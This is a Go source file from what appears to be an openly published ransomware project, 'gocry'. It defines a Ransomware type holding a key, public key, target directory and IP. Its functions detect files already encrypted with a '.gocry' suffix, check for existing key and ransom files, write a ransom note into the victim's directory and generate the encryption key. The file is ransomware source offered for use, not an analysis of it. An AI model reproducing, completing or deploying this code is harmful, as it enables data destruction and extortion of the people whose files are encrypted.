package ransomware

import (
	"errors"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/nireo/gocry/utils"
)

type Ransomware struct {
	Key       []byte
	PublicKey string
	RootDir   string
	IP        string
}

func (rw *Ransomware) CheckIfActiveRansom() error {
	if encrypted := checkIfEncrypted(rw.RootDir); encrypted {
		return errors.New("some files are already encrypted")
	}

	// check if ransom.txt and key.txt exists in the root directory.
	if _, err := os.Stat(rw.RootDir + "/key.txt"); !os.IsNotExist(err) {
		return errors.New("a key.txt already exists: " + err.Error())
	}

	if _, err := os.Stat(rw.RootDir + "/ransom.txt"); !os.IsNotExist(err) {
		return errors.New("a ransom.txt file already exists: " + err.Error())
	}

	return nil
}

// CreateTextFiles is responsible for creating the  ransom.txt. The message
// is taken as a parameter since it makes the main file look more clear and configurable.
func (rw *Ransomware) CreateRansomInfoFile(message string) error {
	file, err := os.Create(rw.RootDir + "/ransom.txt")
	if err != nil {
		return errors.New("could not create ransom.txt file: " + err.Error())
	}
	defer file.Close()

	if _, err := file.WriteString(message); err != nil {
		return errors.New("could not write message to file: " + err.Error())
	}

	return nil
}

func checkIfEncrypted(path string) bool {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			if encrypted := checkIfEncrypted(path + f.Name()); encrypted {
				return true
			}
		} else {
			if strings.HasSuffix(f.Name(), ".gocry") {
				return true
			}
		}
	}

	return false
}

func NewRansomware(toEncrypt string) (*Ransomware, error) {
	key, err := utils.Gen32BitKey()
	if err != nil {
		return nil, err
	}

	return &Ransomware{
		RootDir: toEncrypt,
		Key:     key,
	}, nil
}
